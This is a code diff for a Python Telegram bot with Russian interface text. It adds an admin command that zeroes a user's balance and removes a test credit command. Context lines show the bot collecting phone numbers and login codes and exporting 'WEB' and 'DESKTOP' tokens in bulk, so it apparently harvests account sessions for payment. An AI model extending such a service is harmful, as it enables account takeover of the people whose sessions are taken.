@@ -31,6 +31,7 @@ dp = Dispatcher()
 pending = {}
 waiting_code = {}
 expecting_phone = set()
+expecting_balance_clear = set()
 db_pool = None
 crypto = AioCryptoPay(token=CRYPTO_BOT_TOKEN, network=Networks.MAIN_NET) if CRYPTO_BOT_TOKEN else None
 
@@ -274,8 +275,11 @@ async def stats_cmd(msg: Message):
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="📥 Выгрузить WEB", callback_data="export_web"),
-            InlineKeyboardButton(text="📥 Выгрузить DESKTOP", callback_data="export_desktop")
+            InlineKeyboardButton(text="Выгрузить WEB", callback_data="export_web"),
+            InlineKeyboardButton(text="Выгрузить DESKTOP", callback_data="export_desktop")
+        ],
+        [
+            InlineKeyboardButton(text="Чистка балансов", callback_data="clear_balance")
         ]
     ])
 
@@ -308,12 +312,6 @@ async def pay_cmd(msg: Message):
         )
     except Exception as e:
         await msg.answer(f"❌ Ошибка создания счёта: {e}")
-
-# === Тестовое пополнение ===
-@dp.message(Command("coin"))
-async def coin_cmd(msg: Message):
-    await add_to_balance(msg.from_user.id, 5.0)
-    await msg.answer("✅ На баланс зачислено $5.00 (тестовые средства)")
 
 # === Обработчики callback'ов ===
 
@@ -404,6 +402,12 @@ async def export_desktop_callback(callback: CallbackQuery):
     await callback.message.answer_document(file, caption=f"DESKTOP-токены ({len(desktop_list)} шт.)")
     await callback.answer()
 
+@dp.callback_query(lambda c: c.data == "clear_balance")
+async def clear_balance_callback(callback: CallbackQuery):
+    expecting_balance_clear.add(callback.message.chat.id)
+    await callback.message.answer("Введите ID пользователя, баланс которого нужно очистить:")
+    await callback.answer()
+
 @dp.callback_query(lambda c: c.data == "faq")
 async def faq_callback(callback: CallbackQuery):
     text = (
@@ -447,6 +451,23 @@ async def code_timeout(user_id: int, phone: str):
             await bot.send_message(user_id, "🔖 Время на ввод кода истекло. Пожалуйста, начните авторизацию заново")
         except Exception:
             pass
+
+# === Обработчик ввода ID для чистки баланса ===
+@dp.message(F.text.regexp(r"^\d+$"))
+async def balance_clear_handler(msg: Message):
+    if not await is_approved_group(msg):
+        return
+
+    if msg.chat.id not in expecting_balance_clear:
+        return
+
+    user_id = int(msg.text.strip())
+    expecting_balance_clear.discard(msg.chat.id)
+
+    async with db_pool.acquire() as conn:
+        await conn.execute("UPDATE users SET balance = 0 WHERE user_id = $1", user_id)
+
+    await msg.answer(f"✅ Баланс пользователя {user_id} очищен")
 
 # === Обработчик номера телефона ===
 
